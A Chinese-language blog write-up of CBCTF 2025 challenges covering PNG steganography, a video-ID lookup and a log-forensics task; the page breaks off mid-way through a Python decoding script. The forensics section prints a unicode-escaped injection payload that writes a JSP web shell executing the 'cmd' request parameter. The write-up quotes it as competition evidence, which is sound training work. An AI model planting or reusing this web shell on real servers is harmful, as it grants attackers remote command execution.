<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.1">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","social":{"GitHub":"https://github.com/rekjorekjo || fab fa-github"},"padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"github","dark":"github-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="CBCTF 2025 很晚才知道这个比赛，可惜逆向有些题没时间做了……  [TOC] misc strange_png  这是一张sheep家的狗狗照片，里面藏了什么呢？     附件. misc.png &#8617;  既然是藏了什么，不妨先binwalk提取一下试试。注意root提权 1# binwalk -e --run-as&#x3D;root misc.png    于是尝试解压CCC66.zi">
<meta property="og:type" content="article">
<meta property="og:title" content="CBCTF2025_wp">
<meta property="og:url" content="http://example.com/2025/12/23/CBCTF2025-wp/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="CBCTF 2025 很晚才知道这个比赛，可惜逆向有些题没时间做了……  [TOC] misc strange_png  这是一张sheep家的狗狗照片，里面藏了什么呢？     附件. misc.png &#8617;  既然是藏了什么，不妨先binwalk提取一下试试。注意root提权 1# binwalk -e --run-as&#x3D;root misc.png    于是尝试解压CCC66.zi">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/image-20251223221105.png">
<meta property="og:image" content="http://example.com/images/image-20251122173905690.png">
<meta property="og:image" content="http://example.com/images/image-20251122173951383.png">
<meta property="og:image" content="http://example.com/images/image-20251122174101596.png">
<meta property="og:image" content="http://example.com/images/image-20251122175459026">
<meta property="og:image" content="http://example.com/images/image-20251122183600973.png">
<meta property="og:image" content="http://example.com/images/clean.png">
<meta property="og:image" content="http://example.com/images/image-20251122184026692.png">
<meta property="og:image" content="http://example.com/iamges/QianJianTec1766498811775.png">
<meta property="article:published_time" content="2025-12-23T14:01:24.000Z">
<meta property="article:modified_time" content="2025-12-23T14:12:47.482Z">
<meta property="article:author" content="Rekjo">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/image-20251223221105.png">


<link rel="canonical" href="http://example.com/2025/12/23/CBCTF2025-wp/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2025/12/23/CBCTF2025-wp/","path":"2025/12/23/CBCTF2025-wp/","title":"CBCTF2025_wp"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>CBCTF2025_wp | Hexo</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  






  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js" defer></script>



  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Hexo</p>
      <i class="logo-line"></i>
    </a>
      <img class="custom-logo-image" src="/images/headimage.jpg" alt="Hexo">
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CBCTF-2025"><span class="nav-text">CBCTF 2025</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-text">misc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux"><span class="nav-text">Linux</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-text">Reverse</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Rekjo"
      src="/images/headimage.jpg">
  <p class="site-author-name" itemprop="name">Rekjo</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">6</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/rekjorekjo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;rekjorekjo" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/23/CBCTF2025-wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/headimage.jpg">
      <meta itemprop="name" content="Rekjo">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="CBCTF2025_wp | Hexo">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CBCTF2025_wp
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2025-12-23 22:01:24 / Modified: 22:12:47" itemprop="dateCreated datePublished" datetime="2025-12-23T22:01:24+08:00">2025-12-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="CBCTF-2025"><a href="#CBCTF-2025" class="headerlink" title="CBCTF 2025"></a>CBCTF 2025</h1><hr>
<p>很晚才知道这个比赛，可惜逆向有些题没时间做了……</p>
<p><img src="/images/image-20251223221105.png" alt=""></p>
<p>[TOC]</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h2><ul>
<li><p>strange_png</p>
<blockquote>
<p>这是一张sheep家的狗狗照片，里面藏了什么呢？</p>
</blockquote>
</li>
</ul>
<blockquote id="fn_附件">
<sup>附件</sup>. misc.png<a href="#reffn_附件" title="Jump back to footnote [附件] in the text."> &#8617;</a>
</blockquote>
<p>既然是藏了什么，不妨先binwalk提取一下试试。注意root提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># binwalk -e --run-as=root misc.png</span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20251122173905690.png" alt=""></p>
<p><img src="/images/image-20251122173951383.png" alt=""></p>
<p><img src="/images/image-20251122174101596.png" alt=""></p>
<p>于是尝试解压CCC66.zip，加密了；分析前面的zlib数据，尝试后也无用</p>
<p>难道要rockyou.txt爆破？那真是疯了</p>
<p>冷静思考，考虑到题目中说的图片，于是把这些多余数据去掉，看能否得到图片</p>
<p>先010 editor找一找边界</p>
<p><img src="/images/image-20251122175459026" alt=""></p>
<p>结束标志是IEND chunk 即<strong>00 00 00 00 49 45 4E 44 AE 42 60 82</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=misc.png of=clean.png bs=1 count=838757</span><br></pre></td></tr></table></figure>
<p>还是打不开。HxD,发现文件头不对。正确的是<strong>89 50 4E 47 0D 0A 1A 0A</strong></p>
<p><img src="/images/image-20251122183600973.png" alt=""></p>
<p>补上<strong>89 50 4E 47</strong>即可</p>
<p>从而得到狗狗图片</p>
<p><img src="/images/clean.png" alt=""></p>
<p>可是密码是什么呢？猜想如dog,puppy,sheep,dogdog,123456,666, ,都不对 </p>
<p>于是盲猜一手LSB隐写，这里ai推了一个很好用的工具<strong>zsteg</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install zsteg</span><br></pre></td></tr></table></figure>
<p>下载后直接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg clean.png</span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20251122184026692.png" alt=""></p>
<p>尝试<strong><code>30HDdsaHsjfisdf123321</code></strong>解压成功</p>
<p>幸好没爆破，这什么诡异密码:face_with_head_bandage:</p>
<p>打开得到<strong>INBEGVCGPN3WK3DDGBWWKX3UN5PW22JVMNPXOMDSGFSCC7I=</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INBEGVCGPN3WK3DDGBWWKX3UN5PW22JVMNPXOMDSGFSCC7I=&quot;</span> | <span class="built_in">base32</span> -d</span><br></pre></td></tr></table></figure>
<p>结果<strong>CBCTF{welc0me_to_mi5c_w0r1d!}</strong></p>
<ul>
<li><p>EZSocialEngineering</p>
<blockquote>
<p>今天rocket瞟到int在看的一个视频, 他觉得很有意思, 这是其中一帧的截图, 你可以帮rocket找出视频的b站id吗? 提交CBCTF{BV号}即可</p>
</blockquote>
</li>
</ul>
<p>下载文件，发现右上角明显有up名字Ele实验室，逐个尝试即可</p>
<p>BV号示例：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1KQ4y117nq/?spm_id_from=333.1387.upload.video_card.click&amp;vd_source=7119de8ded3d49fa9f82ff02e78fa678</span><br></pre></td></tr></table></figure>
<p>BV1KQ4y117nq就是本题的BV号。</p>
<p>于是<strong>CBCTF{BV1KQ4y117nq}</strong></p>
<ul>
<li>Realworld-HackVcenter</li>
</ul>
<blockquote>
<p>某个APT(高级持续性威胁)组织试图攻击某高校的校园网络的Hypervisor管理器, 但是该校的网安社团早有预警, 并已经部署某个程序在背后观察着该APT组织的一举一动并准备反制, 现在你作为社团的一员, 请你协助找出一些线索.</p>
<p>提交flag时把flag{}替换为CBCTF{}</p>
</blockquote>
<p>notepad打开，这一大段应该很醒目</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$logger.warn(\&quot;\\u003c\\u0025\\u0040\\u0020\\u0070\\u0061\\u0067\\u0065\\u0020\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u003d\\u0022\\u006a\\u0061\\u0076\\u0061\\u002e\\u0075\\u0074\\u0069\\u006c\\u002e\\u002a\\u002c\\u006a\\u0061\\u0076\\u0061\\u002e\\u0069\\u006f\\u002e\\u002a\\u0022\\u0025\\u003e\\u000a\\u003c\\u0068\\u0074\\u006d\\u006c\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u0062\\u006f\\u0064\\u0079\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0066\\u006f\\u0072\\u006d\\u0020\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064\\u003d\\u0022\\u0067\\u0065\\u0074\\u0022\\u003e\\u000a\\u0009\\u0009\\u003c\\u0069\\u006e\\u0070\\u0075\\u0074\\u0020\\u0074\\u0079\\u0070\\u0065\\u003d\\u0022\\u0074\\u0065\\u0078\\u0074\\u0022\\u0020\\u006e\\u0061\\u006d\\u0065\\u003d\\u0022\\u0063\\u006d\\u0064\\u0022\\u0020\\u0076\\u0061\\u006c\\u0075\\u0065\\u003d\\u0022\\u0066\\u006c\\u0061\\u0067\\u007b\\u0035\\u0037\\u0033\\u0038\\u0039\\u0030\\u0038\\u0034\\u0037\\u0039\\u0030\\u0031\\u0038\\u0034\\u0037\\u0039\\u0038\\u0031\\u0032\\u0037\\u0039\\u0030\\u0038\\u007d\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0069\\u006e\\u0070\\u0075\\u0074\\u0020\\u0074\\u0079\\u0070\\u0065\\u003d\\u0022\\u0073\\u0075\\u0062\\u006d\\u0069\\u0074\\u0022\\u0020\\u0076\\u0061\\u006c\\u0075\\u0065\\u003d\\u0022\\u0053\\u0065\\u006e\\u0064\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0066\\u006f\\u0072\\u006d\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u0070\\u0072\\u0065\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0025\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0069\\u0066\\u0020\\u0028\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\u0022\\u0063\\u006d\\u0064\\u0022\\u0029\\u0020\\u0021\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0029\\u0020\\u007b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u006f\\u0075\\u0074\\u002e\\u0070\\u0072\\u0069\\u006e\\u0074\\u006c\\u006e\\u0028\\u0022\\u0043\\u006f\\u006d\\u006d\\u0061\\u006e\\u0064\\u003a\\u0020\\u0022\\u0020\\u002b\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\u0022\\u0063\\u006d\\u0064\\u0022\\u0029\\u0020\\u002b\\u0020\\u0022\\u003c\\u0042\\u0052\\u003e\\u0022\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0020\\u0070\\u0020\\u003d\\u0020\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u002e\\u0067\\u0065\\u0074\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0028\\u0029\\u002e\\u0065\\u0078\\u0065\\u0063\\u0028\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\u0022\\u0063\\u006d\\u0064\\u0022\\u0029\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u006f\\u0073\\u0020\\u003d\\u0020\\u0070\\u002e\\u0067\\u0065\\u0074\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0069\\u006e\\u0020\\u003d\\u0020\\u0070\\u002e\\u0067\\u0065\\u0074\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0044\\u0061\\u0074\\u0061\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0064\\u0069\\u0073\\u0020\\u003d\\u0020\\u006e\\u0065\\u0077\\u0020\\u0044\\u0061\\u0074\\u0061\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0069\\u006e\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0064\\u0069\\u0073\\u0072\\u0020\\u003d\\u0020\\u0064\\u0069\\u0073\\u002e\\u0072\\u0065\\u0061\\u0064\\u004c\\u0069\\u006e\\u0065\\u0028\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0077\\u0068\\u0069\\u006c\\u0065\\u0020\\u0028\\u0020\\u0064\\u0069\\u0073\\u0072\\u0020\\u0021\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0020\\u0029\\u0020\\u007b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u006f\\u0075\\u0074\\u002e\\u0070\\u0072\\u0069\\u006e\\u0074\\u006c\\u006e\\u0028\\u0064\\u0069\\u0073\\u0072\\u0029\\u003b\\u0020\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0064\\u0069\\u0073\\u0072\\u0020\\u003d\\u0020\\u0064\\u0069\\u0073\\u002e\\u0072\\u0065\\u0061\\u0064\\u004c\\u0069\\u006e\\u0065\\u0028\\u0029\\u003b\\u0020\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u007d\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u007d\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0025\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0070\\u0072\\u0065\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0062\\u006f\\u0064\\u0079\\u003e\\u000a\\u003c\\u002f\\u0068\\u0074\\u006d\\u006c\\u003e\\u000a\&quot;)##   </span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_unicode</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解码Unicode转义序列&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 替换双反斜杠为单反斜杠</span></span><br><span class="line">    text = text.replace(<span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解码Unicode序列</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode_match</span>(<span class="params"><span class="keyword">match</span></span>):</span><br><span class="line">        hex_str = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">int</span>(hex_str, <span class="number">16</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 匹配各种Unicode格式</span></span><br><span class="line">    result = re.sub(<span class="string">r&#x27;\\u([0-9a-fA-F]&#123;4&#125;)&#x27;</span>, decode_match, text)</span><br><span class="line">    result = re.sub(<span class="string">r&#x27;\\U([0-9a-fA-F]&#123;8&#125;)&#x27;</span>, decode_match, result)</span><br><span class="line">    result = re.sub(<span class="string">r&#x27;\\x([0-9a-fA-F]&#123;2&#125;)&#x27;</span>, decode_match, result)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;解码Unicode转义序列&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 修改参数定义，允许多个参数合并</span></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;text&#x27;</span>, nargs=<span class="string">&#x27;*&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;要解码的文本（可多部分）&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="string">&#x27;--file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;从文件读取文本&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--save&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;保存到ascii.txt&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;指定输出文件名&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取输入文本</span></span><br><span class="line">    input_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> args.file:</span><br><span class="line">        <span class="comment"># 从文件读取</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(args.file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                input_text = f.read()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;读取文件失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">elif</span> args.text:</span><br><span class="line">        <span class="comment"># 将命令行多个部分合并</span></span><br><span class="line">        input_text = <span class="string">&quot; &quot;</span>.join(args.text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 从标准输入读取</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入文本（Ctrl+Z结束输入）：&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            input_text = sys.stdin.read()</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> input_text.strip():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;错误：没有输入文本&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解码文本</span></span><br><span class="line">    decoded = decode_unicode(input_text)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 输出结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解码结果：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    <span class="built_in">print</span>(decoded)</span><br><span class="line">    <span class="built_in">print</span>(<span 